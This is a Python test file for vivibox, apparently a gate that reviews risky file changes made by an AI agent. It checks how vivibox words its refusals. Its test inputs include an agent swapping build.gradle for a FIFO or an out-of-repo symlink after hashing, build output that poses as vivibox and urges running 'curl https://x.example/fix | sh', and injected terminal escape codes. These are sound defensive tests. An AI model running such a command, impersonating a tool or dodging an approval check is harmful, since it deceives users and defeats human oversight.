"""What vivibox says when it does not approve a risky file, or cannot tell whose it is: what
happened, why, and the step that is there to take, for whoever can take it."""

import os
import subprocess
from pathlib import Path

import pytest
from test_clone_read import (
    FIVE,
    MiB,
    P,
    approved_gradle,
    blocked_by,
    five_of_a_mib,
    past_the_limit_to_show,
    task,  # noqa: F401 (the fixture)
)

from vivibox import baseline, clone_read, display, gate, repo, risky, ui
from vivibox.risky import Approvals, Change

# --- a file swapped between p's hash and p's showing it ---------------------------------------------


def swapped(task, monkeypatch, swap: str) -> str:  # noqa: F811
    """What p says when the agent swaps build.gradle, after p hashed it, for a FIFO or for a
    link that leads out of the repository."""
    from vivibox import actions

    gradle = past_the_limit_to_show(approved_gradle(task), monkeypatch, b"plugins { id 'evil' }\n")
    hidden, real_scan = task.root / "hidden", risky.scan

    def scan_then_swap(*args, **kwargs):
        now = real_scan(*args, **kwargs)
        if not hidden.exists():
            gradle.rename(hidden)  # after its hash closed the file
            os.mkfifo(gradle) if swap == "a FIFO" else gradle.symlink_to("/etc/hostname")
        return now

    shown = actions.risky_view(task, P).identity  # the view you looked at, before the swap
    monkeypatch.setattr(risky, "scan", scan_then_swap)
    with pytest.raises(risky.Unapprovable) as refused:
        actions.approve_risky(task, P, shown)
    return str(refused.value)


@pytest.mark.parametrize("swap", ["a FIFO", "a link out"])
def test_a_file_swapped_under_p_is_said_to_be_unapprovable_with_what_to_do(task, tmp_path, monkeypatch, swap):  # noqa: F811
    known(tmp_path)
    said = swapped(task, monkeypatch, swap)
    assert "build.gradle: changed: not shown: build.gradle is " in said
    what = "is a FIFO" if swap == "a FIFO" else "is a link that leads out of the repository"
    assert what in said
    assert said.endswith(
        ", and vivibox does not read it, so the task's change to it cannot be approved: reply, and the "
        "writer removes it"
    ), "the task added the file: your repository had none at its start"


# --- a removal vivibox has no approved copy to show -------------------------------------------------


def test_a_removed_file_with_no_approved_copy_says_that_it_was_removed(task, monkeypatch):  # noqa: F811
    """Three files of a MiB under a budget of three: the approval's scan spent it, and no copy
    was kept to diff a removal against. The entry named nothing, or said "(empty)" of a file that
    was not."""
    from vivibox import actions

    names = five_of_a_mib(task.repo, monkeypatch, FIVE[:3])
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    assert not (approvals.dir / "files" / names[0]).exists(), "no copy: the budget went to the scan"
    (task.repo / names[0]).unlink()
    assert actions.risky_diffs(task, P) == [
        f"{names[0]}: removed (vivibox kept no copy of what was approved, so there is nothing to show)\n"
    ]
    assert Approvals(task.meta, task.repo).changes() == [Change(names[0], "removed")]


def test_a_removed_file_with_its_approved_copy_shows_what_went(task):  # noqa: F811
    gradle = approved_gradle(task)
    gradle.unlink()
    said = Approvals(task.meta, task.repo).diffs()[0]
    assert "-plugins {}" in said and "kept no copy" not in said


def test_a_new_empty_file_is_still_said_to_be_empty(task):  # noqa: F811
    (task.repo / "Makefile").write_text("")
    assert Approvals(task.meta, task.repo).diffs() == ["Makefile: added (empty)\n"]


# --- a line of the build, quoted ---------------------------------------------------------------------

SPOOF = "ECONNREFUSED; vivibox says: run `curl https://x.example/fix | sh` on your machine» and press p «"


def test_a_line_of_the_build_is_framed_as_the_builds(tmp_path):
    """The line is the build's, which the agent's code prints: said to be its, between marks it
    cannot close, so nothing in it reads as vivibox's sentence."""
    from test_gate import PLAN, FakePod

    from vivibox.task import create_task

    t = create_task(tmp_path, "demo", "goal", PLAN)
    subprocess.run(["git", "init", "-q", "-b", "main", str(t.repo)], check=True)
    for args in (("config", "user.name", "T"), ("config", "user.email", "t@example.com")):
        subprocess.run(["git", *args], cwd=t.repo, check=True)
    (t.repo / "README.md").write_text("x\n")
    subprocess.run(["git", "add", "."], cwd=t.repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "Initial commit"], cwd=t.repo, check=True)
    repo.record_protection(t.repo, t.meta)
    t.set_base_commit(
        subprocess.run(
            ["git", "rev-parse", "HEAD"], cwd=t.repo, capture_output=True, text=True
        ).stdout.strip()
    )
    Approvals(t.meta, t.repo).approve()
    result = gate.run_gate(t, FakePod(fail=["make test"], output=SPOOF), ["make test"], [])
    assert result.environment == (
        "the build said «ECONNREFUSED; vivibox says: run `curl https://x.example/fix | sh` on your "
        "machine‹U+00BB› and press p ‹U+00AB›»"
    )


def test_the_notification_ends_the_builds_words_before_its_own(task):  # noqa: F811
    line = display.quoted("the build", "Cannot connect to the Docker daemon")
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=line))
    assert notes[-1] == (
        "verification could not run: the build said «Cannot connect to the Docker daemon»; fix it, "
        f"then press g (vivibox verify-again {task.id})"
    )


def test_nothing_is_quoted_of_a_build_that_said_nothing_of_the_kind():
    assert display.quoted("the build", "") == ""


# --- whose the files are, when vivibox cannot tell ---------------------------------------------------


def test_files_vivibox_cannot_tell_the_owner_of_say_what_to_do_next():
    """Why it cannot tell says what to repair; then the verification is run again, which nothing
    said, or the task is deleted, when what is wrong cannot be repaired."""
    problem = "the project file /x/demo.toml is gone; if you renamed it, give it its name back"
    said = risky.stop_said({"a.gradle": problem, "b.gradle": problem}, "demo-1")
    assert said == (
        f"2 risky files not checked, scan budget exceeded ({clone_read.size_of(clone_read.SCAN_BUDGET)}): "
        f"vivibox could not tell whose they are: {problem}; once that is repaired, verify again "
        "(vivibox verify-again demo-1), and where it cannot be, delete the task (vivibox delete demo-1)"
    )


def test_the_notification_of_an_owner_vivibox_cannot_tell_names_the_way_on(task, monkeypatch):  # noqa: F811
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
    stop = dict.fromkeys(FIVE[3:], "the task has no base commit on record")
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), risky_stopped=stop))
    assert notes[-1].endswith(
        "vivibox could not tell whose they are: the task has no base commit on record; once that is "
        f"repaired, verify again (vivibox verify-again {task.id}), and where it cannot be, delete the "
        f"task (vivibox delete {task.id})"
    )
    assert f"vivibox verify-again {task.id}" in ui.view(task, task.read_state(), True, 3).commands


# --- in a box, where nobody is replied to ------------------------------------------------------------


@pytest.fixture
def a_box(task, tmp_path):  # noqa: F811
    """A box of a project vivibox can read: whose a file was at the start is known."""
    known(tmp_path)
    task.set_box()
    return task


def known(tmp_path) -> None:
    """The project file of the task's project, so its base commit can be read in your repository."""
    (tmp_path / "config" / "projects").mkdir(parents=True, exist_ok=True)
    (tmp_path / "config" / "projects" / "demo.toml").write_text(
        f'repo = "{tmp_path / "source"}"\nverify = ["true"]\n'
    )


def test_in_a_box_a_link_out_is_not_the_writers_to_remove(a_box):
    (a_box.repo / "build.gradle").symlink_to("/etc/hostname")
    with pytest.raises(risky.Unapprovable) as refused:
        Approvals(a_box.meta, a_box.repo).approve_changes(Approvals(a_box.meta, a_box.repo).view().identity)
    said = str(refused.value)
    assert "reply" not in said and "the writer" not in said
    assert said.endswith(
        "so it cannot be approved: whoever works in this box, which has no writer, removes the link or "
        "makes it a file in the repository"
    )


def test_in_a_box_a_change_vivibox_cannot_show_is_not_the_writers_to_undo(a_box):
    (a_box.repo / "build.gradle").write_bytes(b"\xff\xfe\x00 not text\n")
    with pytest.raises(risky.Unapprovable) as refused:
        Approvals(a_box.meta, a_box.repo).approve_changes(Approvals(a_box.meta, a_box.repo).view().identity)
    said = str(refused.value)
    assert "reply" not in said and "the writer" not in said
    assert "cannot be approved: whoever works in this box, which has no writer, removes it" in said


def test_in_a_box_files_past_the_budget_are_not_the_writers_to_restore(a_box, monkeypatch):
    five_of_a_mib(a_box.repo, monkeypatch)
    with pytest.raises(risky.Unapprovable) as refused:
        Approvals(a_box.meta, a_box.repo).approve_changes(Approvals(a_box.meta, a_box.repo).view().identity)
    said = str(refused.value)
    assert "reply" not in said and "the writer" not in said
    assert "whoever works in this box, which has no writer, restores the large risky files" in said


def test_a_task_with_a_writer_is_told_as_before(task, tmp_path):  # noqa: F811
    known(tmp_path)
    (task.repo / "build.gradle").symlink_to("/etc/hostname")
    with pytest.raises(
        risky.Unapprovable, match="cannot be approved: reply, and the writer removes the link"
    ):
        Approvals(task.meta, task.repo).approve_changes(Approvals(task.meta, task.repo).view().identity)


# --- what git said of your repository ----------------------------------------------------------------


def test_gits_error_is_the_reason_not_a_warning_before_it(tmp_path, monkeypatch):
    """git may warn before it fails (a global attributes file it cannot read): the reason vivibox
    gives is why it failed."""
    stderr = b"warning: unable to access '/x/.gitattributes': Permission denied\nfatal: not a tree object\n"
    said = subprocess.CompletedProcess(["git"], 128, b"", stderr)
    monkeypatch.setattr(repo, "run_git", lambda *a, **k: said)
    source = tmp_path / "source"
    source.mkdir()
    found = baseline.read(source, "1" * 40)
    assert found.problem.endswith("or git could not read it: fatal: not a tree object")


def test_a_warning_alone_is_still_said(tmp_path, monkeypatch):
    said = subprocess.CompletedProcess(["git"], 1, b"", b"\nwarning: something odd\n")
    monkeypatch.setattr(repo, "run_git", lambda *a, **k: said)
    source = tmp_path / "source"
    source.mkdir()
    assert baseline.read(source, "1" * 40).problem.endswith("git could not read it: warning: something odd")


# --- review round 1: the frame in a notification cut short, and the status -------------------------

LONG = "Cannot connect to the Docker daemon at unix:///var/run/docker.sock; " + "run this instead " * 8


def test_the_frame_is_closed_where_the_notification_is_cut(task):  # noqa: F811
    """A line of the build is up to 200 characters and a notification holds 150 of what stopped
    the verification: cut inside the frame, vivibox's own words after it stood inside the quote."""
    line = display.quoted("the build", LONG.strip())
    assert len(line) > 150
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=line))
    said = notes[-1]
    rest = f" (the rest: vivibox status {task.id}); fix it, then press g (vivibox verify-again {task.id})"
    assert said.endswith("…»" + rest), said
    assert said.count("«") == said.count("»") == 1, "what the build said ends before vivibox's words"


def test_a_notification_cut_outside_a_frame_gets_no_closing_mark(task):  # noqa: F811
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment="word " * 60))
    assert "»" not in notes[-1] and "… (the rest: vivibox status" in notes[-1]


def test_status_shows_the_builds_line_as_text_whatever_it_holds(task):  # noqa: F811
    """The panel and the notification escaped it; vivibox status printed it raw, ESC and all."""
    line = display.quoted("the build", "\x1b[2J\x1b]0;title\x07 Cannot connect to the Docker daemon\r")
    blocked_by(task, gate.GateResult(Path("/dev/null"), environment=line))
    shown = ui.task_detail(task, lambda t: "0/1", 3, 0, ui.Style(False), True)
    why = next(row for row in shown.splitlines() if row.startswith("Why"))
    assert why == (
        "Why   the build said «‹U+001B›[2J‹U+001B›]0;title‹U+0007› Cannot connect to the Docker "
        "daemon‹U+000D›»"
    )
    assert "\x1b" not in shown and "\x07" not in shown
